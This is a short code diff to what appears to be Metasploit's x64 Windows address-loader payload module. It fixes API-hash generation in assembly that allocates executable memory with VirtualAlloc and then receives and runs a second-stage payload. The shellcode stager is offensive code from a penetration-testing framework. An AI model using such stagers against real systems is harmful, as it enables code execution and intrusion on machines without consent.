@@ -17,6 +17,7 @@ module Payload::Windows::AddrLoader_x64
   # Generate and compile the loader
   #
   def generate_loader
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     combined_asm = %Q^
         cld                    ; Clear the direction flag.
         and rsp, ~0xF          ;  Ensure RSP is 16 byte aligned
@@ -47,7 +48,7 @@ module Payload::Windows::AddrLoader_x64
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly received second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
         ; Receive the second stage and execute it...
         mov rbx, rax            ; rbx = our new memory address for the new stage
